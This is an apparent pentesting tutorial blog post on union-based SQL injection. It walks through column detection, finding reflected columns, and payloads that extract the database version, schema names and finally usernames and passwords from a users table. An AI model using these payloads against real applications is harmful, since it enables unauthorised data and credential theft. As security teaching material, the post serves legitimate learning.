---
title: "SQLi Series - Intro to SQL Union Injection II  - 04"
seoTitle: "SQL Union Injection II: Intro Series"
seoDescription: "Learn how to perform and prevent Union-based SQL injections, including detecting vulnerable columns and extracting data"
datePublished: Fri Apr 19 2024 05:06:23 GMT+0000 (Coordinated Universal Time)
cuid: clv67jxs9000409l3gsmzge24
slug: sqli-series-intro-to-sql-union-injection-ii-04
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1713503145012/f5361a2c-f1e9-4c24-9da0-2dd09bbfef07.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1713503164430/41eac61e-24e5-4957-aae5-8280aa89ba82.png
tags: pentesting, sqlinjection

---

### 1.Understanding Union-Based SQL Injection

a) Explanation:

* Union-based SQL injection allows attackers to retrieve data from different tables within the database by appending a UNION SELECT statement to the original query.
    
* The UNION operator combines the results of two or more SELECT statements into a single result set.
    
* For a successful Union-based injection, the following conditions must be met:
    
    * The number of columns in the injected SELECT statement must match the number of columns in the original query.
        
    * The data types of the columns in the injected SELECT statement must be compatible with the data types of the original columns.
        

b) Example:

Consider the following vulnerable SQL query:

```bash
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```

An attacker can inject a payload like:

```bash
' UNION SELECT 1, 2, 3 -- -
```

This will append a new SELECT statement, returning three columns with values 1, 2, and 3, effectively bypassing the original query.

1. Detecting the Number of Columns
    
2. a) Using ORDER BY:
    
    * The ORDER BY clause can be used to determine the number of columns in the original query.
        
    * Steps:
        
        1. Inject an ORDER BY clause with increasing column numbers until an error occurs.
            
        2. The last successful column number represents the total number of columns in the original query.
            
    
    Example:
    
    ```bash
    ' ORDER BY 1-- -
    ' ORDER BY 2-- -
    ' ORDER BY 3-- -
    ...
    ```
    
    Continue incrementing the column number until an error is encountered.
    
3. b) Using UNION SELECT:
    
    * Alternatively, you can use UNION SELECT with increasing number of columns until the injection is successful.
        
    * Steps:
        
        1. Inject a UNION SELECT statement with increasing number of columns.
            
        2. Observe the response until the injection is successful (i.e., no error is returned).
            
        3. The number of columns used in the successful injection represents the total number of columns in the original query.
            
    
    Example:
    
    ```bash
    ' UNION SELECT NULL-- -
    ' UNION SELECT NULL, NULL-- -
    ' UNION SELECT NULL, NULL, NULL-- -
    ...
    ```
    
    Continue adding NULL values until the injection is successful.
    

### 2.Locating the Vulnerable Column

a) Explanation:

* Not all columns returned by the original query may be displayed in the application's response.
    
* To retrieve meaningful data, you need to identify which column(s) are vulnerable and can be used for injection.
    

b) Steps:

1. Perform a Union-based injection with distinct values for each column.
    
2. Observe the application's response to determine which column(s) are reflected in the output.
    
3. Replace the distinct values with actual data retrieval queries in the vulnerable column(s).
    

c) Example: Inject the following payload:

```bash
' UNION SELECT 1, 2, 3, 4-- -
```

If the values 2, 3, and 4 are displayed in the application's response, those columns can be used for data retrieval.

### 3.Extracting Data

a) Database Version:

* Retrieve the database version using the @@version function.
    
* Example:
    
    ```bash
    ' UNION SELECT NULL, @@version, NULL, NULL-- -
    ```
    

b) Database Name:

* Retrieve the current database name using the database() function.
    
* Example:
    
    ```bash
    ' UNION SELECT NULL, database(), NULL, NULL-- -
    ```
    

c) Table Names:

* Retrieve table names from the information\_schema.tables table.
    
* Example:
    
    ```bash
    ' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables-- -
    ```
    

d) Column Names:

* Retrieve column names from the information\_schema.columns table.
    
* Example:
    
    ```bash
    ' UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users'-- -
    ```
    

e) Retrieving Data:

* Once you have identified the table and column names, you can retrieve data from the desired table.
    
* Example:
    
    ```bash
    ' UNION SELECT NULL, username, password, NULL FROM users-- -
    ```
    

### 4.Checkpoint:

* Practice detecting the number of columns using both ORDER BY and UNION SELECT techniques.
    
* Identify the vulnerable column(s) in a given SQL injection scenario.
    
* Retrieve the database version, database name, table names, and column names using Union-based injection.
    
* Extract sensitive data from a specific table using Union-based injection.
    

### 5.Further Reading:

* SQL Injection Cheat Sheet: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    
* SQL Injection Wiki: [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com/)
    
* OWASP SQL Injection Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)